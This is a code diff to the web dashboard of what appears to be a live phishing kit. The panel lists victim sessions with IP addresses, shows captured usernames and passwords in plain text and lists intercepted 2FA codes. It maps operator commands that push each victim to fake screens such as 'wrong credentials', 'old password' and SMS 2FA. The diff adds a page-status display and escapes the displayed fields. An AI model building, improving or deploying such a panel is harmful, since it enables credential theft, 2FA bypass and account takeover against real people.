@@ -148,6 +148,48 @@
       opacity: 0.9;
     }
 
+    .page-spotlight {
+      margin: 0 0 18px;
+      padding: 16px 18px;
+      border-radius: var(--radius-sm);
+      background: linear-gradient(135deg, rgba(99, 102, 241, 0.2), rgba(99, 102, 241, 0.06));
+      border: 1px solid rgba(99, 102, 241, 0.35);
+    }
+
+    .page-spotlight.waiting {
+      background: var(--bg-elevated);
+      border-color: var(--border);
+    }
+
+    .page-spotlight-label {
+      font-size: 0.6875rem;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: var(--text-muted);
+      margin-bottom: 8px;
+    }
+
+    .page-spotlight-value {
+      font-size: 1.375rem;
+      font-weight: 700;
+      letter-spacing: -0.02em;
+      line-height: 1.25;
+      color: var(--text);
+    }
+
+    .page-spotlight.waiting .page-spotlight-value {
+      font-size: 1rem;
+      font-weight: 500;
+      color: var(--text-muted);
+    }
+
+    .page-spotlight-hint {
+      margin-top: 10px;
+      font-size: 0.75rem;
+      color: var(--text-muted);
+      line-height: 1.45;
+    }
+
     .user-card-header {
       display: flex;
       align-items: flex-start;
@@ -354,6 +396,49 @@
       socketStatusText.textContent = 'Error';
     });
 
+    function escapeHtml(str) {
+      if (str == null) return '';
+      const d = document.createElement('div');
+      d.textContent = String(str);
+      return d.innerHTML;
+    }
+
+    /** Maps server `action` / script `page` strings to readable labels */
+    function formatPageLabel(action) {
+      if (action == null || String(action).trim() === '') {
+        return 'Not reported yet';
+      }
+      const raw = String(action).trim();
+      const key = raw.toLowerCase();
+      const map = {
+        '2fa': '2FA (SMS)',
+        sms: '2FA (SMS)',
+        'sms-2fa': '2FA (SMS)',
+        auth: 'Auth',
+        authentication: 'Auth',
+        email: 'Email',
+        login: 'Login',
+        whatsapp: 'WhatsApp',
+        wh: 'WhatsApp',
+        'wrong-creds': 'Wrong credentials',
+        'wrong creds': 'Wrong credentials',
+        'wrong_creds': 'Wrong credentials',
+        'old-pass': 'Old password',
+        'old pass': 'Old password',
+        'old_pass': 'Old password',
+        calendar: 'Calendar',
+        calendly: 'Calendar',
+        'show-2fa': '2FA (SMS)',
+        'show-auth': 'Auth',
+        'show-email': 'Email',
+        'show-whatsapp': 'WhatsApp',
+        'show-wrong-creds': 'Wrong credentials',
+        'show-old-pass': 'Old password',
+        'show-calendar': 'Calendar'
+      };
+      return map[key] || raw;
+    }
+
     socket.on('update-users', ({ users, newUsers }) => {
       usersContainer.innerHTML = '';
 
@@ -368,24 +453,33 @@
       users.forEach(user => {
         const isNew = newUsers.includes(user.id);
         const connected = user.isConnected;
+        const hasPage = user.action != null && String(user.action).trim() !== '';
+        const pageClass = hasPage ? 'page-spotlight' : 'page-spotlight waiting';
+        const pageTitle = hasPage ? formatPageLabel(user.action) : 'Not reported yet — waiting for visitor page or step';
+        const rawAction = hasPage ? escapeHtml(String(user.action)) : '';
         const box = document.createElement('div');
         box.className = 'user-card';
         box.innerHTML = `
           <div class="user-card-header">
             <div>
               <div class="user-card-title">Session</div>
-              <div class="user-card-id"><code>${user.id}</code></div>
+              <div class="user-card-id"><code>${escapeHtml(user.id)}</code></div>
             </div>
             ${isNew ? '<span class="badge-new">New</span>' : ''}
+          </div>
+          <div class="${pageClass}">
+            <div class="page-spotlight-label">Current page / step</div>
+            <div class="page-spotlight-value">${escapeHtml(pageTitle)}</div>
+            ${hasPage ? `<div class="page-spotlight-hint">Server value: <code style="font-size:0.8rem;">${rawAction}</code> · Updates when the client calls the page event, or after 2FA / email / login.</div>` : '<div class="page-spotlight-hint">Connects when your script reports which screen is open, or when a code or login is submitted.</div>'}
           </div>
           <div class="meta-grid">
             <div class="meta-item">
               <label>IP address</label>
-              <div class="value">${user.ip}</div>
+              <div class="value">${escapeHtml(user.ip)}</div>
             </div>
             <div class="meta-item">
               <label>Last seen</label>
-              <div class="value">${user.time.time} · ${user.time.date}</div>
+              <div class="value">${escapeHtml(user.time.time)} · ${escapeHtml(user.time.date)}</div>
             </div>
             <div class="meta-item">
               <label>Status</label>
@@ -393,15 +487,11 @@
             </div>
             <div class="meta-item">
               <label>Login</label>
-              <div class="value">${user.login?.username || '—'} / ${user.login?.password || '—'}</div>
-            </div>
-            <div class="meta-item">
-              <label>Action</label>
-              <div class="value">${user.action || 'None'}</div>
+              <div class="value">${escapeHtml(user.login?.username || '—')} / ${escapeHtml(user.login?.password || '—')}</div>
             </div>
             <div class="meta-item">
               <label>Codes</label>
-              <div class="value">${(user.codes || []).length ? (user.codes || []).join(', ') : '—'}</div>
+              <div class="value">${(user.codes || []).length ? escapeHtml((user.codes || []).join(', ')) : '—'}</div>
             </div>
           </div>
           <div class="actions-label">Actions</div>
